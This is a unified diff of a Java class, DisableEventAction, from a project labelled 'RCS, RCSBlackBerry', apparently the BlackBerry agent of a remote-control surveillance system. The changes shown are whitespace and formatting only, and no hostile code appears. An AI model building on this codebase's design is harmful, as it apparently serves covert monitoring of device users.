@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action;
 
 import blackberry.Trigger;
@@ -20,12 +20,12 @@ public class DisableEventAction extends EventAction {
     //#ifdef DEBUG
     private static Debug debug = new Debug("StopEventAction",
             DebugLevel.VERBOSE);
-    //#endif
-    
-    public DisableEventAction(ConfAction params) {
-        super( params);
-    }
 
+    //#endif
+
+    public DisableEventAction(ConfAction params) {
+        super(params);
+    }
 
     public boolean execute(Trigger trigger) {
         //#ifdef DEBUG
